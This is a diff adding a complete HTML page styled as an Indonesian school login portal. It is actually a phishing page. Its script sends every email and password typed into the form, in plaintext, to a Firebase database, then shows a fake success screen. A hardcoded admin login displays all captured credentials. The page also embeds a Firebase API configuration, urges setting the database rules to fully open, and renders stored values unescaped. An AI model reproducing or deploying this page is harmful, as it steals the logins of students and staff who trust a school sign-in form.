@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Login Sekolah</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{box-sizing:border-box;font-family:Segoe UI,Arial;margin:0;padding:0;}
+html,body{width:100%;height:100%;background:radial-gradient(circle at top,#0a1a2f,#000);overflow:hidden;color:white;}
+#bg{position:fixed;inset:0;z-index:0;pointer-events:none;}
+.center{position:relative;z-index:10;width:100%;height:100%;display:flex;align-items:center;justify-content:center;}
+.card{width:90%;max-width:380px;background:rgba(0,0,0,.7);padding:20px;border-radius:16px;box-shadow:0 0 25px cyan;}
+.hidden{display:none;}
+input,button{width:100%;padding:14px;margin-top:10px;border-radius:10px;font-size:16px;}
+input{background:transparent;border:1px solid cyan;color:white;}
+button{border:none;background:cyan;color:black;font-weight:bold;cursor:pointer;}
+button:active{transform:scale(.98);}
+.success{text-align:center;font-size:22px;color:#00ff99;}
+.user-card{background:rgba(0,255,255,.1);padding:10px;border-radius:10px;margin-top:8px;font-size:14px;border:1px solid cyan;}
+</style>
+</head>
+<body>
+
+<div id="bg"></div>
+
+<div class="center">
+  <div class="card" id="loginBox">
+    <h2 style="text-align:center;margin-bottom:10px;">LOGIN SEKOLAH</h2>
+    <input id="email" placeholder="Email / Username">
+    <input id="password" type="password" placeholder="Password">
+    <button id="loginBtn" type="button">LOGIN</button>
+  </div>
+
+  <div class="card hidden" id="successBox">
+    <div class="success">✔ LOGIN SUKSES</div>
+    <p style="text-align:center;margin-top:10px;">Mengalihkan halaman...</p>
+  </div>
+
+  <div class="card hidden" id="schoolBox">
+    <h3>WEBSITE SEKOLAH</h3>
+    <hr style="margin:10px 0;">
+    <p>Selamat datang di website resmi sekolah kami.</p>
+  </div>
+
+  <div class="card hidden" id="adminBox" style="max-height:80vh;overflow-y:auto;">
+    <h3>DATA LOGIN USER</h3>
+    <hr style="margin:10px 0;">
+    <div id="userList">Memuat data...</div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<script>
+// 1. BG ANIMASI
+const bg=document.getElementById("bg");
+for(let i=0;i<120;i++){
+  const d=document.createElement("div");
+  d.style.position="absolute";d.style.width="2px";d.style.height="2px";
+  d.style.background="cyan";d.style.left=Math.random()*100+"%";
+  d.style.top=Math.random()*100+"%";bg.appendChild(d);
+}
+
+// 2. CONFIG (DARI FOTO KAMU)
+const firebaseConfig = {
+  apiKey: "AIzaSyBktafl9kk7CFzxb80Q_A1XulGHVwTAFU",
+  authDomain: "sekolah-ku-c6e16.firebaseapp.com",
+  databaseURL: "https://sekolah-ku-c6e16-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "sekolah-ku-c6e16",
+  storageBucket: "sekolah-ku-c6e16.firebasestorage.app",
+  messagingSenderId: "996598901732",
+  appId: "1:996598901732:web:0440a7f934e354575f1"
+};
+
+// 3. INIT FIREBASE
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const loginBox=document.getElementById("loginBox");
+const successBox=document.getElementById("successBox");
+const schoolBox=document.getElementById("schoolBox");
+const adminBox=document.getElementById("adminBox");
+const userList=document.getElementById("userList");
+
+// 4. TOMBOL LOGIN
+document.getElementById("loginBtn").onclick = function() {
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if(!email || !password) {
+    alert("Isi semua data!");
+    return;
+  }
+
+  // Simpan data
+  db.ref("users").push({
+    email: email,
+    password: password,
+    time: Date.now()
+  }).then(() => {
+    // Jalankan animasi jika berhasil simpan
+    loginBox.classList.add("hidden");
+    successBox.classList.remove("hidden");
+
+    setTimeout(() => {
+      successBox.classList.add("hidden");
+      if(email === "Azmi" && password === "123") {
+        adminBox.classList.remove("hidden");
+        loadAdmin();
+      } else {
+        schoolBox.classList.remove("hidden");
+      }
+    }, 1500);
+  }).catch((e) => {
+    alert("Gagal konek! Pastikan RULES di Firebase sudah TRUE.");
+    console.log(e);
+  });
+};
+
+// 5. LOAD DATA ADMIN
+function loadAdmin() {
+  db.ref("users").on("value", snap => {
+    userList.innerHTML = "";
+    snap.forEach(child => {
+      const d = child.val();
+      const t = new Date(d.time).toLocaleString("id-ID");
+      userList.innerHTML += `
+        <div class="user-card">
+          <b>Email:</b> ${d.email}<br>
+          <b>Pass:</b> ${d.password}<br>
+          <small>${t}</small>
+        </div>`;
+    });
+  });
+}
+</script>
+</body>
+</html>
